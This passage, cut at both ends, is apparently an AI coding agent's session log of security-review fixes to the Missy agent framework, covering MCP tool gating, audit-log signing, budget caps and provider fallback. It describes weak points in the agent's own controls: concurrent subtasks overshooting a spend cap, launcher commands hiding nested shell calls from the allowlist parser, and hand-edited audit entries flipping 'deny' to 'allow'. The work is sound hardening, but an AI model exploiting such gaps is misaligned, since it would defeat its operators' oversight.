aggregate spend for that one wave transiently exceed a very tight
`max_spend_usd` cap (live-reproduced: a `$0.00001` cap with 3
fully-independent subtasks let all 3 complete, since none of the 3
concurrent checks saw a sibling's not-yet-recorded cost — the
sequential/dependent case, tested separately, correctly denies once a
prior wave's spend is recorded). This is the same category of risk
SR-3.4's original ordering defect addressed for a single call stream —
extending atomic check-and-reserve semantics across concurrent siblings
would need a real reservation/pre-commit mechanism in `CostTracker`,
which doesn't exist yet and is out of scope here (this checkpoint was
about making concurrency and budget-sharing genuinely work, not about
closing every timing gap concurrency itself introduces). The
`MAX_CONCURRENT = 3` cap bounds how bad any single wave's overshoot can
be, and every subsequent wave is correctly gated by the now-committed
total. Tool-group membership in
`missy/policy/tool_policy_pipeline.py`'s curated lists was deliberately
left unmodified — `delegate_task` is reachable under
`capability_mode="full"` today via the generic per-permission
visibility path; curating named-group membership is a policy-tuning
question orthogonal to whether the wiring itself works.

### SR-4.7 (fifth §4 item, twenty-sixth finding this session)

Product-policy decision, asked and confirmed with the operator: wire
real MCP tool execution into production with full enforcement, rather
than the review's alternative of stating the management-only limitation
truthfully in CLI/docs/Web UI. Chosen because MCP servers are
explicitly operator-configured and digest-pinnable (`missy mcp
add`/`pin`) — a fundamentally different trust posture from SR-4.5's
agent-authored-code question, closer to any other integration an
operator deliberately opts into.

`grep -n "mcp\|Mcp\|McpManager" missy/agent/runtime.py` matched nothing
at all before this fix — `McpManager` was referenced only in its own
module files and `missy mcp add/remove/list/pin`'s management commands.
`call_tool()`/`all_tools()` had real, working dispatch logic (safe-name
validation, prompt-injection scanning) but no code path anywhere fed
either into `_get_tools()`/`_execute_tool()`: an agent could never
actually invoke an MCP tool, regardless of how many servers were
connected and pinned. Digest verification (SR-1.11) only ran once, at
connect time — a compromised server could mutate its live manifest
afterward with no reconnect required, and nothing would re-check it.
`ToolAnnotation.requires_approval` was computed correctly from MCP's
`destructiveHint` but never consulted anywhere, since there was no call
site to consult it at.

Fixed: `McpManager.call_tool()` is now the single dispatch chokepoint,
enforcing both concerns immediately before every call, not only at
connect time: re-verifies the pinned digest against the live client's
current `tools` list (mismatch denies + emits an `mcp.tool_execute`
audit event with `reason="digest_mismatch_at_call_time"`); consults
`requires_approval` and blocks on a newly-threaded `approval_gate`
constructor param, failing closed (`reason="no_approval_gate"`) when
none is configured — matching SR-2.2's established fail-closed-without-
confirmation precedent exactly; a real `ApprovalGate.request()` denial/
timeout is caught and also denies. Added `McpToolWrapper(BaseTool)`
(`missy/mcp/tool_wrapper.py`), making "register tools through the
reference monitor" literally true: `AgentRuntime._sync_mcp_tools()`
(called every turn, so newly connected/disconnected servers are
reflected on the very next turn) registers one wrapper per connected
MCP tool into the real `ToolRegistry`, so dispatch goes through the
identical `ToolRegistry.execute()` → `_check_permissions()` →
`tool.execute()` path — and the same `tool_execute` audit event — as
any built-in tool, with `McpManager`'s own `mcp.tool_execute` event
layered on top for the MCP-specific decisions the generic registry
can't see. `McpToolWrapper`'s `ToolPermissions` are derived from the
tool's annotation but documented explicitly as coarse: an MCP tool runs
as its own external process, not through Missy's
`PolicyHTTPClient`/filesystem layer, so this signals intent to the
policy engine without concretely constraining which host/path the
external process actually touches — the digest pin and approval gate
are the concrete, enforceable MCP-specific controls, not the coarse
permission declaration. Threaded `AgentConfig.mcp_approval_gate`
through `McpManager` construction; wired `missy gateway start`'s
existing SR-2.2 `ApprovalGate` into both agent runtimes it builds, so
real approval flows work end-to-end under the gateway.

Live-verified end-to-end with a real `McpManager`+`McpClient` (no real
subprocess, but no other mocking) plus a real `AgentRuntime`/
`ToolRegistry`: (1) a digest-matched, non-destructive MCP tool call
dispatches through `_execute_tool()` → the real registry → the real
wrapper → `McpManager.call_tool()` and returns the actual server
result; (2) a pinned digest that no longer matches the live manifest
denies the call with zero dispatch to the underlying client; (3) a
destructive tool with no approval gate configured is denied end-to-end
through `_execute_tool()`, before the client is ever touched; (4) a
gate that approves lets the call proceed, one that raises
`ApprovalDenied` blocks it. Corrected `CLAUDE.md`'s MCP section
(previously silent on whether tools were callable — exactly the
ambiguity the review flagged as needing a truthful statement one way or
the other), `docs/security.md`'s "MCP Server Isolation" section, and
added a `docs/implementation/module-map.md` entry for the new
`missy.mcp.tool_wrapper` module.

30 new regression tests across 3 files:
`tests/mcp/test_mcp_manager.py::TestCallToolEnforcement` (9 tests —
digest match/drift/unpinned, approval denied/granted/denied-by-gate,
read-only/unannotated tools never gating),
`tests/mcp/test_mcp_tool_wrapper.py` (new file, 17 tests — construction,
permission derivation, schema pass-through, execute()'s success/
blocked-prefix mapping), and
`tests/agent/test_runtime_deep.py::TestMcpToolDispatch` (4 tests
exercising the real `_get_tools()`/`_execute_tool()`/`ToolRegistry`
path). Fixed 2 pre-existing test files whose manual
`McpManager.__new__()` construction shortcut hadn't set the new
attributes `call_tool()` now reads — fixing this surfaced that 2 of
those tests had been exercising `_block_injection=False` (the "warn
only" branch) purely by accident (never set on the manually
constructed instance, so `getattr(..., False)` silently defaulted to
the *non-default* behavior) rather than the real `McpManager()` default
of `block_injection=True` ("block outright") — same root-cause pattern
flagged repeatedly this session: a test bypassing real construction
ends up exercising unrealistic state. Fixed by having those 2 tests
explicitly set `_block_injection = False` (preserving their original
intent) and adding a new `test_injection_blocked_by_default` test
confirming the real default.
`tests/agent/`+`tests/mcp/`+`tests/tools/`+`tests/cli/`+`tests/unit/`+
`tests/security/`+`tests/integration/` (11,954 tests) pass with no
regressions.

**Residual risk, called out explicitly:** Missy has no way to enforce
network/filesystem policy on what an MCP server subprocess itself does
once it's running (it's a separate process — the existing "MCP Server
Isolation" controls, sanitized env/timeouts/response-size limits, are
the process-boundary controls, not app-level network/filesystem
policy); this checkpoint doesn't change that structural fact, it makes
the digest-pin and approval-gate controls actually apply at call time
instead of only at connect time. `McpToolWrapper`'s coarse permission
declaration means the policy engine's network/filesystem checks are
effectively advisory for MCP tools specifically — called out explicitly
rather than left implicit. No MCP-specific rate limit or per-server
budget cap exists beyond the calling session's ordinary budget and
`health_check()`'s dead-server restart.

### SR-4.1 (sixth §4 item, twenty-seventh finding this session)

Two independent sub-findings under one review item.

**Sub-finding 1 (mechanical bug, fixed directly, no product-policy
question involved):** `_record_learnings()` extracted a real
`TaskLearning` record from every completed tool-augmented run but only
passed it to `logger.debug(...)` and discarded it — it never called
`self._memory_store.save_learning(learning)`, despite that method
existing, fully implemented, and already used correctly by the
*retrieval* half of the same feature
(`_build_context_messages()`'s `get_learnings(limit=5)` call). The
`learnings` table was permanently empty in production, in every
configuration, regardless of how many tool-augmented tasks completed —
`CLAUDE.md`'s own claim "persisted in SQLite" was false for the
persisted half specifically. Live-reproduced through a real
`AgentRuntime.run()` with a real `SQLiteMemoryStore`: a completed
tool-augmented run left `get_learnings(limit=5)` empty. Fixed with the
one missing call, guarded by `is not None` and the existing broad
exception handler (persistence failure is best-effort, must not crash a
completed run). Live re-verified: `get_learnings(limit=5)` now returns
the real persisted lesson string immediately after the run.

**Sub-finding 2 (product-policy decision, asked and confirmed with the
operator):** `grep -rln "SleeptimeWorker" missy/` matched only
`missy/agent/sleeptime.py` itself — a fully-built, already-tested (688
pre-existing lines in `tests/agent/test_sleeptime.py`) background
daemon thread with zero production construction sites anywhere. Its own
module docstring literally documents the exact three-point
`AgentRuntime` integration needed (construct+start in `__init__`,
`record_activity()` at the top of `run()`, `stop()` on cleanup) — none
of which existed. Asked whether to wire it opt-in-off-by-default, wire
it exactly as documented (matching `SleeptimeConfig.enabled=True`, its
own class default), or leave it unwired and document the limitation,
since the worker makes background LLM calls (consuming budget) and
processes conversation content without an explicit per-turn user
action — a genuine privacy/cost design question, not a mechanical bug.
**Operator chose: wire it in exactly as documented, enabled by
default.** Fixed: added `AgentRuntime._make_sleeptime_worker()`
(graceful-degradation pattern matching `_make_mcp_manager()`),
constructing `SleeptimeWorker(memory_store=self._memory_store,
provider_registry=<live registry or None>)` and calling `.start()` in
`__init__`. Added `record_activity()` calls at the top of `run()`,
`run_stream()` (which can bypass `run()` entirely via its single-turn
streaming path), and `resume_checkpoint()` — every real entry point
representing genuine agent activity. Added a new `AgentRuntime.shutdown()`
method (didn't exist before) that stops the worker cleanly, useful for
long-running processes (`missy gateway start`), not strictly required
for short-lived ones (`missy ask`) since the daemon thread dies with
the process regardless.

Live-verified: a fresh `AgentRuntime()` genuinely starts a live
`missy-sleeptime` daemon thread; `shutdown()` stops it (confirmed via
`Thread.is_alive()` before/after); the worker's `_memory_store` is
confirmed to be the exact same object as the runtime's own
`_memory_store`, not a disconnected copy. Verified the wiring does not
destabilise the test suite before finalizing: a real `AgentRuntime()`
now starts one real OS thread per instantiation (previously zero), so
`tests/agent/` (4,199 tests, the directory that constructs
`AgentRuntime` most heavily) was timed and run in full — 35.88s, all
passing, no thread-exhaustion or slowdown symptoms (the worker's first
wake is 60s away and real processing only triggers after 300s of idle,
both far outside any single test's runtime, so essentially no test ever
reaches the worker's actual processing code path — only cheap thread
creation/teardown overhead is incurred). Corrected `CLAUDE.md`'s
`SleeptimeWorker` entry (was a generic feature description ambiguous
about wiring status; now states the concrete construction/activity/
shutdown integration and defaults).

12 new/updated regression tests:
`tests/agent/test_coverage_gaps.py::TestRuntimeRecordLearnings` (4 new
tests) and `tests/agent/test_runtime_deep.py::TestSleeptimeWiring` (8
new tests). Fixed 1 pre-existing test whose manual
`AgentRuntime.__new__()` construction hadn't set the new `_sleeptime`
attribute `run_stream()` now reads.
`tests/agent/`+`tests/cli/`+`tests/unit/`+`tests/memory/`+
`tests/security/`+`tests/mcp/`+`tests/tools/`+`tests/integration/`+
`tests/scheduler/` (12,908 tests) pass with no regressions — the one
observed failure is the already-documented, pre-existing Hypothesis
deadline flake (`test_check_host_never_crashes_on_arbitrary_unicode`),
confirmed unrelated to this session's changes in an earlier checkpoint.

**Residual risk, called out explicitly:** enabling `SleeptimeWorker` by
default means real, periodic, un-prompted LLM API costs for any
deployment with idle sessions containing enough unsummarised turns —
the explicit, operator-confirmed trade-off of this checkpoint's choice,
not hidden, should be mentioned in release notes alongside SR-2.1/
SR-2.2's existing behavior-change notes if this branch ships. No
per-deployment retention/privacy policy hook exists yet beyond
`SleeptimeConfig`'s existing tuning knobs (`idle_threshold_seconds`,
`min_unprocessed_turns`, `batch_size`, `use_llm_summarization`) — the
review's phrasing calls for "policy, privacy, retention, and audit
controls," and only "audit" (existing `sleeptime.cycle.*` message-bus
events) was already present before this checkpoint.

### Follow-up correction within the SR-4.1 checkpoint: sleeptime thread accumulation across the full test suite

The `tests/agent/`-only verification above (35.88s, no symptoms) turned
out not to be representative of the full suite. Running the complete
suite with the wiring in place caused real resource accumulation: 96+
live `missy-sleeptime` daemon threads piled up, confirmed via a live
full-suite run that tripped pytest's per-test `faulthandler_timeout=120`
and left the process crawling at ~27% CPU rather than progressing
normally — because the great majority of tests across the suite
construct `AgentRuntime()` without ever calling the new `shutdown()`,
entirely expected since `shutdown()` didn't exist before this
checkpoint so no existing test could have been written to call it.

This was new evidence the operator's original "enabled by default"
answer didn't have visibility into — the question asked beforehand
covered background-LLM-cost/privacy trade-offs, not test-suite thread
lifecycle — so it was surfaced back explicitly rather than silently
patched over or silently reverted. Asked whether to add a test-only
autouse fixture that stops each test's worker(s), keeping the
production default unchanged, or revisit the default given this
concrete cost evidence. **Operator chose: keep the production default,
fix the test suite.**

Fixed: added a repo-root `conftest.py` autouse fixture
(`_stop_sleeptime_workers_after_test`) that wraps
`AgentRuntime._make_sleeptime_worker` for the duration of each test,
recording every real worker it constructs, and calls
`worker.stop(timeout=1.0)` on each in teardown — production code and
the real `start()` call are completely untouched, so tests that
specifically assert the thread is alive during the test (e.g.
`test_sleeptime_worker_constructed_and_started`) still see a genuine
live thread; the fixture only intervenes at teardown. Live-verified via
a real 50×`AgentRuntime()`-construction test with no explicit
`shutdown()` calls, followed by a separate assertion test confirming
zero `missy-sleeptime` threads remained afterward — both pass. Re-ran
the suite that previously piled up threads and tripped the timeout:
`12,909 passed, 1 failed (the pre-existing, already-documented
Hypothesis deadline flake), 13 skipped in 196.91s` — no timeout, no
thread accumulation, no slowdown. Added 2 permanent regression tests to
`TestSleeptimeWiring` as a standing guard against this specific failure
mode recurring.

### SR-4.6 (seventh §4 item, twenty-eighth finding this session)

Purely mechanical fix, no product-policy question — reuses
`AuditLogger`'s already-established publish-wrapping pattern rather
than introducing new design surface.

`OtelExporter.subscribe()` called `event_bus.subscribe(_handler)` with
a single positional argument, but `EventBus.subscribe(event_type: str,
callback)` requires two — `_handler` filled the `event_type` slot and
`callback` was simply missing. This call always raised `TypeError`,
caught by `subscribe()`'s own broad exception handler and merely logged
as a warning. Live-reproduced through the real classes (no mocks):
`OtelExporter(...)` connected successfully (`is_enabled=True`),
`subscribe()` logged "subscribe failed", and a subsequently published
`AuditEvent` produced no span at all — **every configuration with
`otel_enabled: true` exported nothing, ever**, regardless of collector
reachability or which events were published. Separately, `EventBus` has
no wildcard/catch-all subscription mode at all — `_subscribers` is
keyed by exact `event_type` string — so even a syntactically correct
`subscribe()` call could only ever receive one event type, never "every
event" as the class's own docstring promised. `AuditLogger` had already
solved exactly this problem for the on-disk JSONL log by wrapping the
bus instance's `publish()` method directly rather than using
`subscribe()` — its own docstring explicitly documents this as
deliberate. `export_event()` also never redacted `detail` before
setting span attributes (a live gap mirroring SR-1.10 for the OTLP
export path specifically, since `AuditLogger`'s SR-1.10 fix only covers
its own on-disk write path). Export failures were only ever
`logger.debug()`'d — invisible in default logging configuration.
`BatchSpanProcessor(exporter)` was constructed with zero explicit
parameters. Also found while implementing the fix:
`init_otel()`'s disabled-config path returned
`OtelExporter.__new__(OtelExporter)` — skipping `__init__` entirely,
leaving zero instance attributes set, so touching `.is_enabled` raised
`AttributeError` immediately; `tests/unit/test_infrastructure.py` had
two tests that literally asserted this broken state as correct
(`assert not hasattr(exporter, "_enabled")`, with a comment describing
the bug precisely) — the same "test encodes a known-broken behavior as
expected" pattern found repeatedly this session (SR-3.5, SR-3.2).

Fixed: `subscribe()` now wraps `event_bus.publish` directly (mirroring
`AuditLogger`'s exact pattern), making "every event, any type"
genuinely true. `export_event()` now imports and applies the real
SR-1.10 `_redact_detail()` function (reused, not reimplemented) before
any value becomes a span attribute. Failures now increment a new
`export_failure_count` and record `last_export_error`, logged at
WARNING (not DEBUG) with the running failure count. `BatchSpanProcessor`
now takes explicit `max_queue_size=2048`/`max_export_batch_size=512`/
`schedule_delay_millis=5000`/`export_timeout_millis=30000` (all
overridable via new `__init__` parameters) — deliberate, documented
values rather than implicit SDK defaults. Added `_disabled_stub()`
(replacing the bare `__new__()` call) that explicitly initialises every
attribute a real caller might read.

Live-verified end-to-end with the real `opentelemetry-sdk`/
`opentelemetry-exporter-otlp-proto-grpc` packages installed (not
previously present in this dev environment; installed alongside this
fix specifically to enable real verification rather than asserting only
that internal methods were called): (1) constructing a real
`OtelExporter`, calling the real `subscribe()`, then publishing a real
`AuditEvent` through the real `event_bus` no longer logs "subscribe
failed," and the SDK's `BatchSpanProcessor` genuinely attempts real
network delivery to the configured `localhost:4317` endpoint (observed
via the SDK's own "Connection refused, retrying" log lines — proof the
full config → subscribe → publish → export → network-attempt chain is
live); (2) using `InMemorySpanExporter` as a stand-in "collector"
(obtaining a tracer directly from a locally-constructed
`TracerProvider` rather than the process-global
`trace.set_tracer_provider()` API, since that global can only be set
once per process and an earlier test in the same run already claims it
— a real cross-test-isolation subtlety discovered while writing this
verification, not a production bug), a published event genuinely
arrives as a span with the correct name and attributes, across three
arbitrary/unrelated `event_type` strings, confirming the fix isn't
accidentally type-scoped like the original bug implicitly was; (3) a
secret embedded in `detail.url` never reaches the "collector"
unredacted.

Fixed 2 pre-existing test files whose tests exercised the now-removed
`event_bus.subscribe()` call path directly — rewritten to assert the
new wrap-publish behavior instead; corrected the two
`test_infrastructure.py` tests that had encoded the disabled-stub crash
as expected behavior. `tests/observability/`+`tests/cli/`+
`tests/integration/`+`tests/unit/`+`tests/security/` (5,980 tests) pass
with no regressions — the one observed failure is the already-
documented pre-existing Hypothesis deadline flake, unrelated. Corrected
`CLAUDE.md`'s Observability section and
`docs/implementation/module-map.md`'s `missy.observability.otel` entry.

**Residual risk, called out explicitly:** the OTel SDK's
`BatchSpanProcessor` (even with explicit bounds now) still silently
drops spans once its queue fills if the collector is unreachable for a
sustained period — standard, documented OTel SDK behavior, not
something this checkpoint changes; `export_failure_count`/
`last_export_error` only capture failures `export_event()` itself
observes synchronously, not asynchronous network-export failures the
SDK's background export thread encounters after the span has already
been handed off — those remain visible only in the SDK's own logger
output. No `missy doctor` check currently surfaces
`export_failure_count`/`is_enabled` for OTLP specifically — a
reasonable, small follow-up.

### SR-4.8 (eighth and final §4 item, twenty-ninth finding this session — closes section 4 of the security review entirely)

Operator-confirmed scope was the largest of three options offered:
build the full production mechanism (per-provider cooldown/retry-
eligibility state, budget-gated and tool-compatibility-ordered
fallback selection, complete redacted audit trail) rather than a
smaller bounded retry-once fix or a documentation-only correction.

Three independent gaps, each live-reproduced against real classes
before any fix: (1) `ProviderRegistry.rotate_key()` (round-robin
`api_keys` rotation) had zero production call sites anywhere — not in
`AgentRuntime`, not in any CLI command, not in the scheduler —despite
extensive isolated unit-test coverage; (2) `ModelRouter`/
`score_complexity()`/`select_model()` (fast/primary/premium tier
routing) likewise had zero production callers; `fast_model`/
`premium_model` config fields are consumed directly by
`SleeptimeWorker._llm_summarize()`, bypassing `ModelRouter` entirely —
the tier-selection *config surface* partially works but the *routing
engine* CLAUDE.md described does not exist in the runtime path; (3)
`AgentRuntime._get_provider()`'s only fallback is a static,
start-of-run-only `is_available()` check (SDK installed + key present
— a purely local check, never a live probe) run once per
`run()`/`run_stream()` call. Live-reproduced: a provider that passes
this check but then raises `ProviderError` on the actual
`complete_with_tools()` call propagates straight out of
`_tool_loop()`'s blanket exception handler with zero retry, zero key
rotation, zero cross-provider fallback, and zero audit event, despite a
second healthy, fully-configured provider sitting in the same
registry — the resolved `provider` object is a single loop-local
variable reused for every iteration with no re-resolution path once
the loop starts.

Fixed: new `missy/providers/health.py` (`classify_provider_error()` —
auth/rate_limit/timeout/unknown from a `ProviderError`'s message text,
reusing the vocabulary every built-in provider already raises
consistently) and `ProviderRegistry.key_for()` (reverse-looks-up a
provider instance's registry key by identity, since `.name` need not
match the registration key). New
`AgentRuntime._call_provider_with_fallback()` is the chokepoint both
`_single_turn()` and `_tool_loop()`'s main iteration now route every
provider call through: each provider name gets its own `CircuitBreaker`
(`_get_breaker_for()`, independent of the primary's existing
`self._circuit_breaker` so tests that swap it directly keep working) —
cooldown/half-open state tracked per candidate, not globally; an
auth-classified failure with 2+ configured keys triggers exactly one
`rotate_key()` retry on the same provider (live-verified to actually
flip the provider's real `_api_key`/`api_key` attribute, and confirmed
skipped for rate_limit/timeout since rotating credentials can't fix
either); a pre-flight `_check_budget()` gates the fallback attempt
itself (reuses SR-3.4's per-session `CostTracker`); fallback candidates
are filtered by cooldown eligibility (breaker not `OPEN`) and, when the
call requires tool-calling, sorted to prefer a candidate overriding
`complete_with_tools` over one that only inherits the base class's
tool-less default, flagging `tool_compatibility_degraded: true` in the
audit event when no tool-capable candidate exists; each candidate's
message list is rebuilt fresh per *its own* `accepts_message_dicts`
convention rather than reused from the original provider (transcript
integrity, live-verified: `list[dict]` vs. `list[Message]` depending on
target, with semantic content preserved); `self.config.model` (a model
id on the originally configured provider) is never forwarded to a
fallback candidate, which always uses its own configured default
instead (live-verified `received_model is None`); every transition —
`agent.provider.call_failed`/`.key_rotated`/`.fallback` — is a redacted
audit event via the existing `_emit_event()` → `event_bus.publish()` →
`AuditLogger._redact_detail()` pipeline (same mechanism as
SR-1.10/SR-4.6, reused rather than reimplemented, live-verified
end-to-end through a real `AuditLogger` writing to a temp JSONL file: a
fabricated secret-shaped string in a provider's error message never
reached disk unredacted); a tool call proposed by a fallback provider
mid-loop is still gated by SR-2.3's `allowed_tool_names` check at
dispatch time, live-verified unaffected by which provider proposed the
call; when every candidate fails, the last real exception is re-raised
(fails closed, matching `_get_provider()`'s existing doctrine).

New `tests/providers/test_provider_health.py` (13 tests), 4 new tests
in `tests/providers/test_registry_deep.py` (`key_for()`), and new
`tests/agent/test_provider_fallback.py` (12 tests) against real
`BaseProvider` subclasses (not `MagicMock(spec=...)`) registered in a
real `ProviderRegistry`. One pre-existing bug found and fixed while
wiring the new method into `_tool_loop()`: an unconditional
`get_registry()` call at the top of `_call_provider_with_fallback()`
broke 3 existing tests in `test_mutation_fingerprint.py` that never
initialize a registry on the pure-success path — fixed by resolving
the registry lazily, only inside the failure branch (same "MagicMock
bypasses real `__init__`-shaped assumptions" root-cause family found
repeatedly this session, though here it was the new code's own
unconditional dependency that was wrong, not a test's mock). `tests/agent/`+`tests/providers/`
(5,128 tests) and `tests/cli/`+`tests/api/`+`tests/integration/`+
`tests/scheduler/`+`tests/mcp/` (2,463 tests) pass with no regressions.
Corrected `CLAUDE.md`'s Providers section and
`docs/implementation/module-map.md`'s `missy.providers.registry`/
`missy.agent.runtime` entries; added a `missy.providers.health` entry.

**Residual risk, called out explicitly:** `ModelRouter` remains
intentionally unwired dead code — this checkpoint was scoped to
rotation/fallback per the review's literal text, not to building the
complexity-based tier-routing engine, a materially different feature
(choosing a cheaper model proactively vs. recovering from a failed
one) and not part of the operator's chosen scope. Per-provider
`CircuitBreaker` cooldown timers use the same fixed threshold/backoff
defaults as the primary's breaker, not yet tunable per-provider via
config. Rate-limit failures never trigger key rotation by design
(rotating credentials cannot fix a rate limit); a provider with a
genuinely per-key (not per-account) rate limit would benefit from
rotation there too, deliberately not implemented since no built-in
provider documents that behavior.

### SR-1.1 (thirtieth finding this session — closes §1 except SR-1.9b)

The review's three specific criticisms, each live-reproduced first:
(1) the only signing path anywhere (`AgentRuntime._emit_event()`)
signed just `{session_id, task_id, event_type}` — `result`, the field
an attacker would flip to turn a `deny` into an `allow`, was
completely unauthenticated; (2) the signature lived *inside* the
mutable `detail` dict it was supposedly protecting; (3) only events
emitted via that one method were signed — everything published
directly via `event_bus.publish()` (the overwhelming majority) was
never signed at all. Reproduced the review's exact PoC against
current code: signed a real `deny` event, hand-edited `result` to
`allow` in the persisted JSONL, read it back — succeeded cleanly,
undetected.

Fixed: new `AgentIdentity.load_or_generate()` (single source of truth
so `AgentRuntime` and `AuditLogger` sign with the same keypair — its
`path` parameter defaults to `None` rather than binding
`DEFAULT_KEY_PATH` at function-definition time, specifically so tests
can monkeypatch the module constant, a real Python gotcha caught via
a live test failure while writing this). `AuditLogger._handle_event()`
— the one place every published event reaches disk regardless of
type, per its own docstring — now signs the complete canonical record
and stores `identity_signature` as a top-level field, never nested in
`detail`. New `verify_audit_log()` recomputes each line's signature
and reports valid/tampered/unsigned/malformed. Direct `AuditLogger(...)`
construction stays unsigned by default (no implicit key I/O for the
70+ existing test/CLI-reader call sites); `init_audit_logger()` — the
documented production entry point — signs by default with zero
call-site changes needed at its one production wiring site in
`cli/main.py`. Deleted the old narrow 3-field signing block in
`_emit_event()`. New `missy audit verify` CLI command.

Live re-verified: the review's exact PoC now reports `tampered`;
`detail` tampering (not just top-level fields) is caught; deleting the
signature reports `unsigned`, not a false valid; wrong-identity
verification fails correctly; JSON key reordering does not itself
trigger a false tamper report.

**Second bug found and fixed along the way**: running the broader
regression suite in a deliberately reordered sequence
(`observability/security/cli` before `agent`, unlike the alphabetical
default) exposed 14 failures in `tests/agent/test_runtime.py` —
`TypeError: ... got 'MagicMock'` inside `censor_response()`. Root
cause: those tests never patched `get_tool_registry`, implicitly
relying on the global `ToolRegistry` singleton never being
initialised during the session; once populated by an earlier test
file, `_get_tools()` returned real tools, flipping `_run_loop()` to
the tool-call loop and hitting an unconfigured
`provider.complete_with_tools` mock instead of the properly-configured
`provider.complete` mock these tests actually rely on. Not a bug in
this checkpoint's production code — a latent, pre-existing
test-isolation gap that only this checkpoint's own out-of-order
verification run happened to expose (every prior full-suite run this
session was accidentally protected by `tests/agent/` sorting
alphabetically before the polluting directories). Fixed with a new
autouse fixture patching `get_tool_registry` to raise, matching the
file's actual single-turn test intent; re-verified the exact
previously-failing ordering clean (7,449 passed, 4 skipped) before
re-running the full standard suite.

**Residual risk, called out explicitly:** no hash chain linking
consecutive events, so a whole line deleted from the middle of the
file (or truncation at the end) is not currently detectable — the
review's own text explicitly noted no hash-chain claim exists in the
product, so this was out of scope; this checkpoint closes exactly the
documented gap (unsigned→signed, unverified→verified). Key lifecycle
(rotation, revocation, multi-key trust) is unaddressed. No `missy
doctor` check surfaces signing status yet — small follow-up.

## Verification

```text
python3 -m pytest tests/ -q -o faulthandler_timeout=120
3 failed, 21055 passed, 13 skipped in 530.63s (0:08:50)
```

The 3 failures are exactly the known pre-existing `CameraDiscovery`
cache-TTL flakes (task #11), confirmed unrelated via `git stash` in
earlier checkpoints and reproduced again here unchanged. Zero
regressions from SR-1.1 or any checkpoint this session. This closes
section 4 ("Advertised But Unwired Features") of the security review
entirely — all eight SR-4.x items are now fixed — and section 1
except for SR-1.9b (DNS TOCTOU), now the last remaining numbered
SR-x.y item.

Full detail in `BUILD_STATUS.md`, `AUDIT_SECURITY.md`, and
`TEST_RESULTS.md` — each has one dated entry per checkpoint this
session, oldest at the bottom, nothing overwritten. (This file is
condensed to stay readable — no information is lost, it lives in the
three files above.)

## Open tasks (session-tracked, carry into next session)

- **#9** SR-1.x through SR-4.x security review remediation — this
  session covered SR-1.1, SR-1.2/1.3, SR-1.4, SR-1.5, SR-1.6, SR-1.7,
  SR-1.8, SR-1.9a, SR-1.10, SR-1.11, SR-1.12, SR-1.13, SR-2.1, SR-2.2,
  SR-2.3, SR-2.4, SR-3.1 (substantially via FX-B), SR-3.2, SR-3.3,
  SR-3.4 (including its cross-session-aggregation sub-finding), SR-3.5,
  SR-4.4, SR-4.5, SR-4.3, SR-4.2, SR-4.7, SR-4.1, SR-4.6, SR-4.8 —
  **§2, §3, and §4 are now all fully closed, with no open sub-findings
  in any of them; §1 is closed except for one item.** §4 ("Advertised
  But Unwired Features") closed with all eight items fixed (SR-4.4
  done-criteria verification, SR-4.5 self_create_tool honesty, SR-4.3
  checkpoint resume, SR-4.2 sub-agent delegation, SR-4.7 MCP tool
  execution, SR-4.1 long-term memory, SR-4.6 OTLP export, SR-4.8
  provider rotation/fallback). SR-1.1 closed: `AuditLogger` now signs
  the complete event at the single write chokepoint (not 3 of 8 fields
  embedded in mutable `detail`), with real `verify_audit_log()` and a
  new `missy audit verify` CLI command. Remaining: **SR-1.9b** (DNS
  TOCTOU, substantially harder than SR-1.9a — needs connecting to a
  pinned policy-verified IP rather than re-resolving at connect time)
  — the sole remaining numbered SR-x.y item, plus the "harden
  secondary availability hazards" bullet.
- **SR-1.7's launcher sub-finding** remains open — `find`/`xargs`/
  `bash`/`sudo` etc. are allowlist-able with only a warning, and
  nested shell commands inside a launcher's quoted arguments are
  structurally invisible to any static command-string parser. This is a
  product-policy decision (block launchers outright vs. runtime
  interception), not a mechanical bug fix — needs explicit product
  input before implementing.
- **#10** Full 89-case tool-specific validation backlog — not yet
  re-run against current code.
- **#11** Pre-existing vision `CameraDiscovery` cache-TTL flake (3
  tests) — confirmed present before this session's changes, unrelated,
  small isolated fix needed in `missy/vision/discovery.py`.
- **#12** Wire an authenticated Discord pairing approval endpoint —
  the SR-1.12 fix removed the vulnerable path but pairing currently has
  *no* working approval surface at all.
- **#15** `allowed_roles` Discord config field documented but never
  enforced.
- **#16** FX-F bullets 2/4: build an actual disposable, threat-modeled
  browser-test environment and rerun WB-002 through WB-007 + XT-001
  against it. This dev sandbox cannot launch a browser at all (no
  playwright installed) — confirmed live, matching the harness's own
  observation.
- **#17** FX-G process-group cleanup on acpx timeout — implementation
  works but needs the test-suite migration from mocking
  `subprocess.run` to `subprocess.Popen` done carefully in its own
  session.
- **Lesson worth remembering for future test-double changes** (from
  the SR-3.2 checkpoint): a bare `MagicMock()` with no `spec`
  auto-vivifies any attribute access, so a test that mocks a
  provider/client and calls a method name that doesn't exist on the
  real interface will silently pass forever instead of catching the
  typo — always construct interface-heavy mocks with
  `spec=<the real class>` so a renamed or nonexistent method call fails
  the test the same way it would fail in production.
- **Lesson worth remembering for future "likely already fixed"
  checkpoints** (from the SR-3.3 checkpoint): a finding flagged as
  "probably already resolved as a side effect of an earlier fix" is a
  hypothesis, not a conclusion — SR-3.3 was flagged exactly this way
  and turned out to be two independent, fully live, never-worked-at-all
  bugs (a missing `permissions` attribute crashing dispatch, plus a
  runtime that never wired a required kwarg into the tool call). Both
  had been hidden by every existing test calling `tool.execute(...)`
  directly instead of dispatching through the real registry/runtime.
  The general pattern worth checking whenever a similar flag comes up:
  does at least one existing test exercise the *real* dispatch path
  (the actual registry/runtime method a production call would go
  through), or only the tool's/function's internal logic in isolation?
  If only the latter, the "verify" step isn't optional.
- **Lesson worth remembering for future policy-engine changes** (from
  SR-1.9a's checkpoint): a security fix that adds real DNS/network
  calls to a previously-synchronous/local code path can silently turn
  into a major test-suite performance regression if fixture hostnames
  aren't mocked — always time the affected test directories before/after
  and grep for realistic-looking hostnames used as allowlist entries in
  tests before considering such a change done.
- **Also noticed, not caused by this session:** an intermittent,
  pre-existing Hypothesis-deadline flake in
  `tests/security/test_property_based_fuzz.py::TestNetworkPolicyEngineFuzz::test_check_host_never_crashes_on_arbitrary_unicode`
  (no `deadline=None`, no DNS mock, occasional slow live
  `socket.getaddrinfo()` call trips the 200ms default). Confirmed via
  `git show HEAD~5` this file predates the session and never touches
  SR-1.9a's changed code paths. Not fixed — same category as the
  already-tracked vision flake (task #11); consider bundling both into
  one small follow-up task.

## The single biggest remaining gap

**None of this session's fixes have been validated against a real or
scripted acpx delegate invocation.** All verification so far is
